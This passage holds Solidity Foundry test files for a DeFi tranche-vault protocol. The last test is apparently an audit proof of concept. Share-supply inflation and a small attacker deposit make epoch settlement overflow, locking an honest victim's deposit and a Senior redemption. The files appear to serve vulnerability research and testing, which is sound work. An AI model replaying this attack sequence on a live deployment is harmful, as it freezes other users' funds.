        p.posSize = _positionSize(a);
        p.claim = engine.traderClaimBalanceAssets(a);
    }

    function _logParty(string memory tag, address a) internal {
        Party memory p = _party(a);
        emit log_named_uint(string.concat(tag, " wallet"), p.wallet);
        emit log_named_uint(string.concat(tag, " ch.balance"), p.chBalance);
        emit log_named_uint(string.concat(tag, " ch.free"), p.chFree);
        emit log_named_uint(string.concat(tag, " jShares"), p.jShares);
        emit log_named_uint(string.concat(tag, " sShares"), p.sShares);
        emit log_named_uint(string.concat(tag, " posSize"), p.posSize);
        emit log_named_uint(string.concat(tag, " claim"), p.claim);
    }

    function _logPool(string memory tag) internal {
        emit log_named_uint(string.concat(tag, " pool.totalAssets"), pool.totalAssets());
        emit log_named_uint(string.concat(tag, " pool.raw"), settlementToken.balanceOf(address(pool)));
        emit log_named_uint(string.concat(tag, " pool.unassigned"), pool.unassignedAssets());
        emit log_named_uint(string.concat(tag, " pool.pendingRecap"), pool.pendingRecapitalizationAssets());
        emit log_named_uint(string.concat(tag, " engine.claims"), engine.totalTraderClaimBalanceAssets());
        emit log_named_uint(string.concat(tag, " maxLiability"), _maxLiability());
        emit log_named_uint(string.concat(tag, " degraded"), engine.degradedMode() ? 1 : 0);
        emit log_named_uint(string.concat(tag, " jSupply"), juniorVault.totalSupply());
        emit log_named_uint(string.concat(tag, " sSupply"), seniorVault.totalSupply());
        emit log_named_uint(string.concat(tag, " treasury"), clearinghouse.getAccountAssetBuckets(PROTOCOL_TREASURY_ACCOUNT).settlementBalanceAssets);
    }

    /// @dev Drains the global FIFO with real calls: execute at the head's first eligible tick, else expire.
    function _drainQueue(string memory tag, uint256 indexPrice) internal returns (uint256 executed, uint256 terminal) {
        uint256 guard;
        while (router.nextExecuteId() != 0 && guard++ < 40) {
            uint64 head = router.nextExecuteId();
            OrderV3Types.ExecutionResult memory result = _executeReal(head, indexPrice);
            if (result.status == OrderV3Types.LifecycleStatus.Executed) {
                ++executed;
            } else if (result.status == OrderV3Types.LifecycleStatus.Pending) {
                emit log_named_uint(string.concat(tag, " pending head"), head);
                emit log_named_uint(string.concat(tag, " pendingReason"), uint256(result.pendingReason));
                result = _expire(head);
                emit log_named_uint(string.concat(tag, " expired terminalReason"), uint256(result.terminalReason));
                ++terminal;
            } else {
                emit log_named_uint(string.concat(tag, " terminal order"), head);
                emit log_named_uint(string.concat(tag, " terminalReason"), uint256(result.terminalReason));
                ++terminal;
            }
        }
        assertEq(router.nextExecuteId(), 0, string.concat(tag, ": queue must drain"));
    }

    function _closeAll(address[] memory traders, uint256 indexPrice) internal {
        for (uint256 i; i < traders.length; ++i) {
            uint256 size = _positionSize(traders[i]);
            if (size == 0) {
                continue;
            }
            (,,,, CfdTypes.Side side,,) = engine.positions(traders[i]);
            uint64 active = _views().activePositionProtectionId(traders[i]);
            if (active != 0) {
                uint8 status = _protectionStatus(active);
                if (status == uint8(PositionProtectionTypes.PositionProtectionStatus.Armed)) {
                    vm.prank(traders[i]);
                    _actions().cancelPositionProtection(active);
                } else if (status == uint8(PositionProtectionTypes.PositionProtectionStatus.Latched)) {
                    vm.prank(RP1_KEEPER);
                    uint64 retryId = _actions().retryPositionProtectionClose(active);
                    OrderV3Types.ExecutionResult memory r = _executeReal(retryId, indexPrice);
                    assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Executed), "latched retry must fill");
                    continue;
                }
            }
            _closeReal(traders[i], side, size, indexPrice);
        }
        for (uint256 i; i < traders.length; ++i) {
            assertEq(_positionSize(traders[i]), 0, "every position must close");
        }
    }

    function _assertReleaseConfig() internal {
        CfdTypes.RiskParams memory params = _engineRiskConfig().riskParams;
        assertEq(engine.CAP_PRICE(), 2e8);
        assertEq(params.vpiFactor, 0.01e18);
        assertEq(params.maxSkewRatio, 0.4e18);
        assertEq(params.maintMarginBps, 10);
        assertEq(params.initMarginBps, 20);
        assertEq(params.fadMarginBps, 300);
        assertEq(params.baseCarryBps, 500);
        assertEq(params.minBountyAssets, 1e6);
        assertEq(params.bountyBps, 10);
        assertEq(params.keeperShareBps, 5000);
        assertEq(params.protocolShareBps, 0);
        assertEq(engine.frozenCloseSpreadBps(), 50);
        assertEq(engine.executionFeeBps(), 4);
        assertEq(engine.settlementBufferBps(), 25);
        assertEq(CfdTypes.SIZE_QUANTUM, 1e20);
        assertEq(engine.fadRunwaySeconds(), 1 hours);
        assertEq(pletherOracle.basketMaxConfidenceRatioBps(), 10);
        assertEq(pletherOracle.adverseConfidenceMultiplierBps(), 2500);
        assertEq(router.minOpenNotionalAssets(), 1000e6);
        assertEq(router.maxPendingOrders(), 5);
        assertEq(router.positionProtectionTriggerBountyAssets(), 200_000);
        assertEq(pool.maxSeniorExposureAssets(), 40_000_000e6);
        assertEq(pool.maxSeniorShareBps(), 8000);
        assertEq(juniorVault.maintenanceFeeAprBps(), 0);
        assertEq(juniorVault.maintenanceFeeRecipient(), PROTOCOL_TREASURY_ACCOUNT);
        assertEq(juniorVault.seedReceiver(), address(this));
        assertEq(seniorVault.seedReceiver(), address(this));
        assertTrue(pool.isSeedLifecycleComplete());
        assertTrue(pool.isTradingActive());
        assertEq(coordinator.guardian(), RP1_GUARDIAN);
    }

    // ------------------------------------------------------------------
    // rp1 additions: Senior claim helpers, owner recap helper, class probes
    // ------------------------------------------------------------------

    function _claimSeniorRedeem(uint256 requestId, address controller) internal returns (uint256 assets) {
        uint256 shares = seniorVault.claimableRedeemRequest(requestId, controller);
        assertGt(shares, 0, "funded senior redemption shares required");
        vm.prank(controller);
        assets = seniorVault.claimRedeem(requestId, shares, controller, controller);
    }

    function _claimSeniorDeposit(uint256 requestId, address controller) internal returns (uint256 shares) {
        uint256 assets = seniorVault.claimableDepositRequest(requestId, controller);
        assertGt(assets, 0, "claimable senior deposit required");
        vm.prank(controller);
        shares = seniorVault.claimDeposit(requestId, assets, controller, controller);
    }

    /// @dev Documented R04 step 4 / R17: owner funds and approves the engine, then recapitalizes.
    function _ownerRecap(uint256 amount) internal {
        settlementToken.mint(address(this), amount);
        settlementToken.approve(address(engine), amount);
        engine.recapitalizePool(amount);
    }

    function _deficitNow() internal view returns (uint256 deficit) {
        uint256 claims = engine.totalTraderClaimBalanceAssets();
        uint256 assets = pool.totalAssets();
        uint256 effective = assets > claims ? assets - claims : 0;
        uint256 liability = _maxLiability();
        deficit = liability > effective ? liability - effective : 0;
    }

    function _bufferNow() internal view returns (uint256) {
        return (_maxLiability() * engine.settlementBufferBps() + 9999) / 10_000;
    }

    /// @dev Tries a settle through the documented route and logs the revert selector instead of failing.
    function _trySettle(string memory tag, uint256 indexPrice) internal returns (bool ok) {
        ICfdEngineTypes.TerminalNavSnapshot memory snapshot = engine.terminalNavSnapshot();
        if (!snapshot.hasOpenPositions || engine.isOracleFrozen()) {
            try pool.settleLpEpoch(0, 0) {
                emit log_named_string(tag, "cached settle ok");
                return true;
            } catch (bytes memory err) {
                emit log_named_bytes(string.concat(tag, " cached settle reverted"), err);
                return false;
            }
        }
        try router.settleLpEpoch(_settlementData(indexPrice)) {
            emit log_named_string(tag, "atomic settle ok");
            return true;
        } catch (bytes memory err) {
            emit log_named_bytes(string.concat(tag, " atomic settle reverted"), err);
            return false;
        }
    }

    function _tryClear(string memory tag) internal returns (bool ok) {
        try engine.clearDegradedMode() {
            emit log_named_string(tag, "clearDegradedMode ok");
            return true;
        } catch (bytes memory err) {
            emit log_named_bytes(string.concat(tag, " clearDegradedMode reverted"), err);
            return false;
        }
    }

    function _tryAssign(string memory tag, bool toSenior, address receiver) internal returns (bool ok) {
        try pool.assignUnassignedAssets(toSenior, receiver) {
            emit log_named_string(tag, "assignUnassignedAssets ok");
            return true;
        } catch (bytes memory err) {
            emit log_named_bytes(string.concat(tag, " assignUnassignedAssets reverted"), err);
            return false;
        }
    }

    function _tryClaimSettle(string memory tag, address account) internal returns (bool ok) {
        vm.prank(account);
        try engine.settleTraderClaim(account) {
            emit log_named_string(tag, "settleTraderClaim ok");
            return true;
        } catch (bytes memory err) {
            emit log_named_bytes(string.concat(tag, " settleTraderClaim reverted"), err);
            return false;
        }
    }

    function _logTranches(string memory tag) internal {
        emit log_named_uint(string.concat(tag, " seniorPrincipal"), pool.seniorPrincipal());
        emit log_named_uint(string.concat(tag, " seniorHWM"), pool.seniorHighWaterMark());
        emit log_named_uint(string.concat(tag, " juniorPrincipal"), pool.juniorPrincipal());
        (uint256 sp, uint256 jp) = pool.getPendingDepositTrancheState();
        emit log_named_uint(string.concat(tag, " pendingSenior"), sp);
        emit log_named_uint(string.concat(tag, " pendingJunior"), jp);
        emit log_named_uint(string.concat(tag, " canAcceptSenior"), pool.canAcceptTrancheDeposits(true) ? 1 : 0);
        emit log_named_uint(string.concat(tag, " canAcceptJunior"), pool.canAcceptTrancheDeposits(false) ? 1 : 0);
        emit log_named_uint(string.concat(tag, " freeAssets"), pool.getFreeAssets());
    }
}
```

### V1xNearZero.t.sol

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {V1xFixture} from "./V1xFixture.sol";
import {MarketCalendarLib} from "@plether/perps/libraries/MarketCalendarLib.sol";

/// @notice Lane v1x, assignment #5: Junior principal near zero with a surviving share supply, then a large Junior
///         deposit activating at that price, repeated. The near-zero state is reached with time and settlement calls
///         only: the Senior coupon drains Junior principal (capped at Junior), and the settlement is called in the
///         second where a few thousand atoms remain. No storage writes, no trades.
contract V1xNearZeroTest is V1xFixture {

    address internal constant OLD = address(0x01D);
    uint256 internal constant STAKE = 250_000e6;

    function _entrant(uint256 i) internal pure returns (address) {
        return address(uint160(0xD00D0000 + i));
    }

    function _pendingJunior() internal view returns (uint256 j) {
        (, j) = pool.getPendingDepositTrancheState();
    }

    function _couponPerSecond() internal view returns (uint256) {
        (uint256 s,) = pool.getPendingDepositTrancheState();
        return (s * pool.seniorRateBps()) / (10_000 * 365 days) + 1;
    }

    /// @dev Warps until the pending Junior principal is at most `target` and still positive.
    function _drainTo(uint256 target) internal {
        for (uint256 guard; guard < 64; ++guard) {
            uint256 j = _pendingJunior();
            if (j <= target) {
                break;
            }
            uint256 dt = (j - target) / _couponPerSecond();
            _warpChecked(vm.getBlockTimestamp() + (dt == 0 ? 1 : dt));
        }
        require(_pendingJunior() != 0, "overshot to zero");
    }

    function _frozenAt(uint256 t) internal pure returns (bool frozen) {
        (, frozen) = MarketCalendarLib.marketStatus(t, false, false, 1 hours);
    }

    /// @dev Entries are deferred while the oracle is frozen. If Junior would run out inside or next to a weekend,
    ///      an ordinary Junior top-up by the old LP moves that moment by about three days.
    function _steerOffWeekend() internal {
        for (uint256 guard; guard < 4; ++guard) {
            uint256 t0 = vm.getBlockTimestamp() + _pendingJunior() / _couponPerSecond();
            if (!_frozenAt(t0 - 6 hours) && !_frozenAt(t0) && !_frozenAt(t0 + 6 hours)) {
                return;
            }
            uint256 topUp = _couponPerSecond() * 3 days;
            emit log_named_uint("weekday steering top-up (atoms)", topUp);
            _outsideRequestCutoff();
            uint256 id = _requestJuniorDeposit(OLD, topUp);
            _warpChecked(pool.lpEpochStart(id));
            pool.settleLpEpoch(0, 0);
            _claimJuniorDeposit(id, OLD);
        }
        revert("could not steer off the weekend");
    }

    function _logState(string memory tag) internal {
        emit log_named_uint(string.concat(tag, " time"), vm.getBlockTimestamp());
        emit log_named_uint(string.concat(tag, " stored junior"), pool.juniorPrincipal());
        emit log_named_uint(string.concat(tag, " stored senior"), pool.seniorPrincipal());
        emit log_named_uint(string.concat(tag, " junior supply"), juniorVault.totalSupply());
    }

    /// @dev Best responses once a settlement reverts: cancel, wait, pause-route, later settles.
    function _responses(address entrant, uint256 depId) internal {
        vm.prank(entrant);
        try juniorVault.cancelPendingDeposit(depId) returns (uint256 a) {
            emit log_named_uint("cancel in the same second: refunded", a);
        } catch (bytes memory err) {
            emit log_named_bytes("cancel in the same second reverted", err);
        }
        uint256 snap = vm.snapshotState();
        pool.pause();
        try pool.settleLpEpoch(0, 0) {
            emit log_string("settle with deposits paused: ok");
        } catch (bytes memory err) {
            emit log_named_bytes("settle with deposits paused reverted", err);
        }
        assertTrue(vm.revertToState(snap));
        uint256[4] memory waits = [uint256(1), 60, 1 hours, 24 hours];
        for (uint256 k; k < waits.length; ++k) {
            snap = vm.snapshotState();
            _warpChecked(vm.getBlockTimestamp() + waits[k]);
            emit log_named_uint("--- after wait seconds", waits[k]);
            emit log_named_uint("pending junior", _pendingJunior());
            try pool.settleLpEpoch(0, 0) {
                emit log_string("settle: ok");
                emit log_named_uint("deposit claimable", juniorVault.claimableDepositRequest(depId, entrant));
            } catch (bytes memory err) {
                emit log_named_bytes("settle reverted", err);
            }
            vm.prank(entrant);
            try juniorVault.cancelPendingDeposit(depId) returns (uint256 a) {
                emit log_named_uint("cancel: refunded", a);
            } catch (bytes memory err) {
                emit log_named_bytes("cancel reverted", err);
            }
            assertTrue(vm.revertToState(snap));
        }
    }

    function test_NZ_CouponDrainThenLargeDepositCycles() public {
        _seedJuniorLp(OLD, STAKE);
        _seedSeniorLp(SENIOR_LP, 990_000e6);
        _logState("[start]");

        for (uint256 i; i < 10; ++i) {
            emit log_named_uint("=== cycle", i + 1);
            address entrant = _entrant(i);
            // Leave enough Junior principal to survive until the request's epoch starts.
            _steerOffWeekend();
            uint256 perSecond = _couponPerSecond();
            _drainTo(perSecond * 4200 + 5e6);
            _outsideRequestCutoff();
            emit log_named_uint("pending junior at request", _pendingJunior());
            uint256 depId = _requestJuniorDeposit(entrant, STAKE);
            _warpChecked(pool.lpEpochStart(depId));
            // The settlement second: at most one second of coupon left in Junior.
            _drainTo(perSecond * 2);
            assertFalse(engine.isOracleFrozen(), "settlement second must be a live-market second");
            uint256 jAtSettle = _pendingJunior();
            uint256 supplyBefore = juniorVault.totalSupply();
            emit log_named_uint("pending junior at settle (atoms)", jAtSettle);
            emit log_named_uint("supply before", supplyBefore);
            emit log_named_uint("old LP value before (atoms)", juniorVault.convertToAssets(juniorVault.balanceOf(OLD)));

            try pool.settleLpEpoch(0, 0) {
                uint256 supplyAfter = juniorVault.totalSupply();
                emit log_named_uint("supply after", supplyAfter);
                emit log_named_uint("supply multiplier", supplyAfter / supplyBefore);
                _claimJuniorDeposit(depId, entrant);
                emit log_named_uint("entrant value after (atoms)", juniorVault.convertToAssets(juniorVault.balanceOf(entrant)));
                emit log_named_uint("old LP value after (atoms)", juniorVault.convertToAssets(juniorVault.balanceOf(OLD)));
                if (i > 0) {
                    address prev = _entrant(i - 1);
                    emit log_named_uint("previous entrant value after (atoms)", juniorVault.convertToAssets(juniorVault.balanceOf(prev)));
                }
                _logState("[after activation]");
            } catch (bytes memory err) {
                emit log_named_bytes("SETTLE REVERTED", err);
                _logState("[at revert]");
                _responses(entrant, depId);
                return;
            }
        }
    }

    /// @dev Pure arithmetic only: the supply at which a 250,000 USDG deposit quote stops fitting in 256 bits.
    function test_NZ_QuoteOverflowBoundary() public {
        uint256 supply = 250_000e9;
        for (uint256 n; n < 12; ++n) {
            try juniorVault.quoteDepositFromState(STAKE, 1000, supply, 0) returns (uint256 shares) {
                emit log_named_uint("cycle", n + 1);
                emit log_named_uint("  supply", supply);
                emit log_named_uint("  minted", shares);
                if (type(uint256).max - supply < shares) {
                    emit log_string("  mint would overflow total supply");
                    return;
                }
                supply += shares;
            } catch (bytes memory err) {
                emit log_named_uint("quote reverts at cycle", n + 1);
                emit log_named_bytes("  revert", err);
                return;
            }
        }
    }

}
```

### CodexVaultOrganicAggregate.t.sol

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {V1xNearZeroTest} from "./V1xNearZero.t.sol";
import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";

contract CodexVaultOrganicAggregateTest is V1xNearZeroTest {
    address internal constant HONEST_VICTIM = address(0xFAD0BEEF);

    function _couponFor(uint256 senior, uint256 secondsElapsed) internal view returns (uint256) {
        return senior * pool.seniorRateBps() * secondsElapsed / (10_000 * 365 days);
    }

    function _amountForFollowingHour(uint256 seniorBefore, uint256 juniorBefore, uint256 elapsed)
        internal view returns (uint256)
    {
        uint256 coupon = _couponFor(seniorBefore, elapsed);
        return coupon + 10_000 - juniorBefore;
    }

    function test_CFR_OrganicAggregatePoison() public {
        _seedJuniorLp(OLD, STAKE);
        _seedSeniorLp(SENIOR_LP, 990_000e6);
        uint256 seedTime = vm.getBlockTimestamp();
        uint256 weekdayTopUp = _couponPerSecond() * 9 days;
        _outsideRequestCutoff();
        uint256 shiftId = _requestJuniorDeposit(OLD, weekdayTopUp);
        _warpChecked(pool.lpEpochStart(shiftId));
        pool.settleLpEpoch(0, 0);
        _claimJuniorDeposit(shiftId, OLD);
        _steerOffWeekend();
        uint256 perSecond = _couponPerSecond();
        _drainTo(perSecond * 4200 + 5e6);
        _outsideRequestCutoff();
        uint256 snap = vm.snapshotState();
        uint256 trialId = _requestJuniorDeposit(_entrant(0), 1e6);
        _warpChecked(pool.lpEpochStart(trialId));
        _drainTo(perSecond * 2);
        uint256 firstTime = vm.getBlockTimestamp();
        (uint256 firstSenior, uint256 firstJunior) = pool.getPendingDepositTrancheState();
        uint256 nextTime = (firstTime / 1 hours + 1) * 1 hours;
        uint256 firstAmount = _amountForFollowingHour(firstSenior, firstJunior, nextTime - firstTime);
        assertTrue(vm.revertToState(snap));
        uint256 firstId = _requestJuniorDeposit(_entrant(0), firstAmount);
        _warpChecked(firstTime);
        pool.settleLpEpoch(0, 0);
        _claimJuniorDeposit(firstId, _entrant(0));

        // Price nineteen small, ordinary hourly recaps against coupon. Stop
        // after cycle eighteen while the next deposit quote can still fit.
        for (uint256 i = 1; i < 18; ++i) {
            uint256 maturity = (vm.getBlockTimestamp() / 1 hours + 1) * 1 hours;
            uint256 preview = vm.snapshotState();
            _warpChecked(maturity);
            (uint256 seniorBefore, uint256 juniorBefore) = pool.getPendingDepositTrancheState();
            assertGt(juniorBefore, 0);
            assertTrue(vm.revertToState(preview));
            uint256 amount = _amountForFollowingHour(seniorBefore, juniorBefore, 1 hours);
            uint256 id = _requestJuniorDeposit(_entrant(i), amount);
            _warpChecked(maturity);
            pool.settleLpEpoch(0, 0);
            _claimJuniorDeposit(id, _entrant(i));
        }
        emit log_named_uint("after cycle18 supply", juniorVault.totalSupply());
        emit log_named_uint("after cycle18 projected J", _pendingJunior());
        uint256 branch = vm.snapshotState();

        // A final 300 USDG recap still quotes successfully. A victim deposit
        // sized just below today's quote limit can
        // quote at request time, but the next coupon accrual pushes it over.
        uint256 finalId = _requestJuniorDeposit(_entrant(18), 300e6);
        _warpChecked(pool.lpEpochStart(finalId));
        assertGt(_pendingJunior(), 0);
        pool.settleLpEpoch(0, 0);
        _claimJuniorDeposit(finalId, _entrant(18));
        emit log_named_uint("after final recap projected J", _pendingJunior());
        emit log_named_uint("after final recap supply", juniorVault.totalSupply());
        uint256 maxSafeToday = Math.mulDiv(
            type(uint256).max, _pendingJunior() + 1, juniorVault.totalSupply() + 1_000
        );
        uint256 victimAssets = 145_000e6;
        assertLt(victimAssets, maxSafeToday, "round victim request has finite estimate");
        assertGt(victimAssets, 100_000e6, "victim size remains material");
        uint256 requestEstimate = juniorVault.estimateDepositShares(victimAssets);
        assertGt(requestEstimate, 0, "honest pre-request estimate succeeds");
        assertLe(juniorVault.totalSupply(), type(uint256).max - requestEstimate, "request is mintable before coupon");
        emit log_named_uint("max finite request estimate", maxSafeToday);
        emit log_named_uint("victim request assets", victimAssets);
        emit log_named_uint("victim request estimate", requestEstimate);
        uint256 victimId = _requestJuniorDeposit(HONEST_VICTIM, victimAssets);
        uint256 seniorId = _requestSeniorRedeem(SENIOR_LP, seniorVault.convertToShares(10_000e6));
        uint256 victimRequestTime = vm.getBlockTimestamp();
        emit log_named_uint("victim request timestamp", victimRequestTime);
        // The honest 145,000 USDG request alone activates and funds both queues
        // at the first maturity. A later 3,000 USDG same-epoch request crosses
        // the cumulative quote boundary after one hour of Senior coupon.
        uint256 noAttacker = vm.snapshotState();
        _warpChecked(pool.lpEpochStart(victimId));
        pool.settleLpEpoch(0, 0);
        assertGt(juniorVault.claimableDepositRequest(victimId, HONEST_VICTIM), 0, "victim alone activates");
        assertGt(seniorVault.claimableRedeemRequest(seniorId, SENIOR_LP), 0, "Senior alone funds");
        assertTrue(vm.revertToState(noAttacker));
        _warpChecked(victimRequestTime + 1 minutes);
        assertLt(vm.getBlockTimestamp(), pool.lpEpochStart(victimId), "attacker request precedes cutoff");
        uint256 attackerAssets = 3_000e6;
        uint256 combinedQuote = juniorVault.estimateDepositShares(victimAssets + attackerAssets);
        assertLe(juniorVault.totalSupply(), type(uint256).max - combinedQuote, "aggregate mintable before coupon");
        uint256 attackerId = _requestJuniorDeposit(_entrant(19), attackerAssets);
        assertEq(attackerId, victimId, "attacker joins victim epoch");
        emit log_named_uint("attacker request assets", attackerAssets);
        emit log_named_uint("combined pre-coupon quote", combinedQuote);
        emit log_named_uint("attacker request timestamp", vm.getBlockTimestamp());
        assertEq(victimId, seniorId);
        _warpChecked(pool.lpEpochStart(victimId));
        vm.expectRevert(abi.encodeWithSignature("Panic(uint256)", uint256(0x11)));
        pool.settleLpEpoch(0, 0);
        vm.prank(HONEST_VICTIM);
        vm.expectRevert(bytes4(keccak256("TrancheVault__DepositEpochAlreadyActive()")));
        juniorVault.cancelPendingDeposit(victimId);
        _warpChecked(victimRequestTime + 24 hours);
        emit log_named_uint("day-one timestamp", vm.getBlockTimestamp());
        assertFalse(_frozenAt(vm.getBlockTimestamp()), "day-one live market");
        assertGt(_pendingJunior(), 0, "Junior remains positive past 24h");
        vm.expectRevert(abi.encodeWithSignature("Panic(uint256)", uint256(0x11)));
        pool.settleLpEpoch(0, 0);
        assertEq(seniorVault.claimableRedeemRequest(seniorId, SENIOR_LP), 0);
        vm.prank(HONEST_VICTIM);
        vm.expectRevert(bytes4(keccak256("TrancheVault__DepositEpochAlreadyActive()")));
        juniorVault.cancelPendingDeposit(victimId);
        assertEq(juniorVault.pendingDepositAssets(HONEST_VICTIM, victimId), victimAssets);
        assertEq(juniorVault.pendingDepositAssets(_entrant(19), attackerId), attackerAssets);
        emit log_named_uint("treatment J after24h", _pendingJunior());
        emit log_named_uint("victim escrow", juniorVault.pendingDepositAssets(HONEST_VICTIM, victimId));
        emit log_named_uint("attacker escrow", juniorVault.pendingDepositAssets(_entrant(19), attackerId));
        emit log_named_uint("seed to final recap seconds", victimRequestTime - seedTime);

        _warpChecked(victimRequestTime + 25 hours);
        assertFalse(_frozenAt(vm.getBlockTimestamp()), "hour-25 live market");
        assertGt(_pendingJunior(), 0, "Junior remains positive after 25h");
        vm.expectRevert(abi.encodeWithSignature("Panic(uint256)", uint256(0x11)));
        pool.settleLpEpoch(0, 0);
        assertEq(seniorVault.claimableRedeemRequest(seniorId, SENIOR_LP), 0);
        vm.prank(HONEST_VICTIM);
        vm.expectRevert(bytes4(keccak256("TrancheVault__DepositEpochAlreadyActive()")));
        juniorVault.cancelPendingDeposit(victimId);
        emit log_named_uint("treatment J after25h", _pendingJunior());

        uint256 lockedState = vm.snapshotState();
        uint256 ownerDonation = 300e6;
        settlementToken.mint(address(this), ownerDonation);
        settlementToken.transfer(address(pool), ownerDonation);
        assertEq(pool.excessAssets(), ownerDonation, "donation remains unaccounted");
        pool.accountExcess();
        emit log_named_uint("projected Junior after owner donation", _pendingJunior());
        pool.settleLpEpoch(0, 0);
        assertGt(seniorVault.claimableRedeemRequest(seniorId, SENIOR_LP), 0, "owner cure funds Senior");
        assertGt(juniorVault.claimableDepositRequest(victimId, HONEST_VICTIM), 0, "owner cure fills victim");
        assertGt(juniorVault.claimableDepositRequest(attackerId, _entrant(19)), 0, "owner cure fills attacker");
        emit log_named_uint("owner donation", ownerDonation);
        emit log_named_uint("cured Senior claimable", seniorVault.claimableRedeemRequest(seniorId, SENIOR_LP));
        emit log_named_uint("cured victim claimable", juniorVault.claimableDepositRequest(victimId, HONEST_VICTIM));
        emit log_named_uint("cured attacker claimable", juniorVault.claimableDepositRequest(attackerId, _entrant(19)));
        assertTrue(vm.revertToState(lockedState));

        // Same snapshot, next recap is only one hour's coupon. It drains to
        // zero during the following day, allowing victim refund and Senior funding.
        assertTrue(vm.revertToState(branch));
        uint256 controlMaturity = (vm.getBlockTimestamp() / 1 hours + 1) * 1 hours;
        uint256 controlPreview = vm.snapshotState();
        _warpChecked(controlMaturity);
        (uint256 controlSenior, uint256 controlJunior) = pool.getPendingDepositTrancheState();
        assertTrue(vm.revertToState(controlPreview));
        uint256 controlAmount = _amountForFollowingHour(controlSenior, controlJunior, 1 hours);
        uint256 controlId = _requestJuniorDeposit(_entrant(18), controlAmount);
        _warpChecked(controlMaturity);
        pool.settleLpEpoch(0, 0);
        _claimJuniorDeposit(controlId, _entrant(18));
        uint256 controlVictimId = _requestJuniorDeposit(HONEST_VICTIM, victimAssets);
        uint256 controlSeniorId = _requestSeniorRedeem(SENIOR_LP, seniorVault.convertToShares(10_000e6));
        uint256 controlTime = vm.getBlockTimestamp();
        _warpChecked(controlTime + 24 hours);
        assertEq(_pendingJunior(), 0, "control Junior naturally wipes");
        pool.settleLpEpoch(0, 0);
        assertGt(seniorVault.claimableRedeemRequest(controlSeniorId, SENIOR_LP), 0);
        vm.prank(HONEST_VICTIM);
        assertEq(juniorVault.cancelPendingDeposit(controlVictimId), victimAssets);
        emit log_named_uint("control victim refund", victimAssets);
    }
}
```
